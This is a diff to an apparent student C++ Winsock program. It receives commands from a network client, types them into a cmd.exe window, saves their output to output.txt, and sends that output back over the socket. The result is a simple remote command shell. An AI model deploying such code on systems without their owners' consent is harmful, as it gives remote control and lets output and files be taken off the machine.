@@ -157,7 +157,7 @@ int main() {
 
 				string commande = "";
 				int count = 0;
-				const string path = "../Data/";
+				const string path = "output.txt";
 
 				int pathIndex = 0;
 				string filePath = "";
@@ -165,7 +165,7 @@ int main() {
 				vector<string> fileNameVec(0);
 				string fileName;
 
-				// On recoit les commandes
+				// On recoit les commandes du client
 
 				ZeroMemory(buf, 4096);
 				bytesReceived = recv(sock, buf, 4096, 0);
@@ -175,15 +175,52 @@ int main() {
 					commande = string(buf, 0, bytesReceived);
 					cout << commande << endl;
 
+					// On execute la commande du client dans le CMD
+
 					windowCMD = FindWindow(L"ConsoleWindowClass", L"C:\\WINDOWS\\system32\\cmd.exe");
+
+					commande += " > output.txt";
 
 					for (auto c : commande) {
 						SendMessage(windowCMD, WM_CHAR, c, NULL);
 					}
 					SendMessage(windowCMD, WM_CHAR, '\r', NULL);
-
 				}
 
+				// Lecture et envoie du ouput de la console
+
+				ifstream file(path, ios::binary);
+
+				if (file.is_open()) {
+					
+					cout << "Document ouvert" << endl;
+
+					// Envoyer la taille (octets) du fichier
+
+					file.seekg(0, ios::end);
+					fileSize = file.tellg();
+					send(sock, (char*)&fileSize, sizeof(long), 0);
+
+					// Envoyer le fichier partie par partie
+
+					file.seekg(0, ios::beg);
+
+					do {
+						
+						// Lecture du fichier et envoie
+
+						ZeroMemory(buf, 4096);
+						file.read(buf, 4096);
+
+						if (file.gcount() > 0)
+							send(sock, buf, file.gcount(), 0); // voir projet 3
+
+					} while (file.gcount() > 0);
+
+					file.close();
+				}
+				else
+					cout << "Erreur lors de l'ouverture" << endl;
 			}
 		}
 	}
